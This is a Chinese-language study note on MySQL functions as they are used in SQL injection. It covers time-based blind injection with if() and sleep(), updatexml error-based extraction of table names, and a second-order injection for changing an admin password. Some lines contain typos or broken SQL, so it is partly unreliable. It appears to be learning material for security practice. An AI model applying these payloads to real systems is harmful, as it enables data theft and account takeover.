length()--查询结果长度
select length(username) from table where id = 1;
-- 不加条件的话他有几行就会返回几行,如图所示
-- +--------------+
-- | length(name) |
-- +--------------+
-- |            5 |
-- |            3 |
-- |            4 |
-- +--------------+
-- 查询id为一的table成员名username的长度
substr(x,y,z)=mid(x,y,z)=substring(x,y,z)--截断查询结果的某个字符
-- 三个参数
-- 第一个参数:要提取的字符串
-- 第二个参数:开始提取的位置,从一开始
-- 第三个参数:提取的字符数量
select substr(username,1,1) from table where id = 1;
-- 不加条件依旧返回多行结果
-- +------------------+
-- | substr(name,1,1) |
-- +------------------+
-- | a                |
-- | w                |
-- | n                |
-- +------------------+
ascii()--查询单个字符的ascii码
--通过select ascii(substr(name,1,1)) from user;
-- +-------------------------+
-- | ascii(substr(name,1,1)) |
-- +-------------------------+
-- |                      97 |
-- |                     119 |
-- |                     110 |
-- +-------------------------+
即使你查的不是单个字符,他也只会给你显示第一个字符的ascii码
-- select ascii(substr(name,1,2)) from user;
-- +-------------------------+
-- | ascii(substr(name,1,2)) |
-- +-------------------------+
-- |                      97 |
-- |                     119 |
-- |                     110 |
-- +-------------------------+
limit x,y--分页查找
select user from table limit 0,1
-- 只查一行却又不知道id是否存在做条件时使用limit来限定只查一行内容
--x代表从第几个索引开始查，零为第一行，y代表从索引开始往下查几行
group_concat()
将多行用指定方式(默认为逗号)隔开
-- 列如将多个name成员合并成一行打印
-- select group_concat(name) from user;
-- +--------------------+
-- | group_concat(name) |
-- +--------------------+
-- | admin,whb,name     |
-- +--------------------+
is_int():
判断一个变量是不是整数类型
可用于判断输入是否为整数,如若是其他类型直接返回false不执行,但同时,因为php默
认设置传进去的参数都会被默认改为字符串类型,你无论传数字还是命令代码都会被拦截
,所以无用
--$id = $_GET['id'];这里的参数就会被转换转换为字符串，正常合法数字也直接被拦截
--if(is_int($id)){
--    $sql = "select * from user where id=$id";
--}
str_replace();
-- 替换字符串函数
-- 新变量名 = str_replace('查找字符串','替换字符串',变量名);
-- 通过将函数中的敏感字替换来防止注入:
$id = 1 and union select 1
$id = str_replace('select','fuck',$id);
$id就变为1 and union fuck 1
if():
-- 判断函数
if(判断条件,成立值,不成立值)
-- 条件判断,成立就用成立值,反之用不成立值
select if(username = 'whb',1,1=2) from user;
-- 可用于成员名判断,成功返回1,不成功返回设置的布尔值
select * from user where if(id>5,1=1,1=2)
-- 用于条件判断,id>5条件为真打印,条件为假直接不打印
sleep():
-- 时间函数,延迟时间
select * from user where sleep(4)
-- 使整条查询语句每次查询都延迟四秒
select sleep(4), * from user;
-- 查询语句在查询前延时四秒,只延时一遍
-- sleep在where前后位置不同效果也不同,在后面当作条件时每查一行都会再执行一次
if(条件,sleep(),错值)
-- :时间盲注常用
left():
-- left(字符串,截取个数)
-- 将内容按照指定个数截取前几位出来
upadatexml()报错注入
select upadatexml(1,concat(0x7e,需要报错获取的1内容,如database(),0x7e),1);
查询语句用括号包裹,函数直接写,字符串用引号包裹
-- 注入效果：
--  select updatexml(1,concat(0x7e,'databa',0x7e),1);
-- 返回结果:ERROR 1105 (HY000): XPATH syntax error: '~databa~'
-- select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1);
-- 返回结果XPATH syntax error: '~emails,referers,uagents,users~'
-- 0x7e为特殊符号代码,也可切换为其他特殊符号或者特殊字符串,字符串必须加引号
-- select updatexml(1,concat('~',database(),'~'),1);
-- ERROR 1105 (HY000): XPATH syntax error: '~user~'
二次注入:(二次注入是指将注入的被转义恶意代码再次被当成sql语句调用执行)
insert into table (id,name) values (1,'admin'#);创建账号并写入恶意代码
update set password='123' where id=1 and username='(admin'#)' limit 0,1;(#将后面全部注释)
通过调用恶意代码进行二次注入修改admin管理员密码,获取其账号权限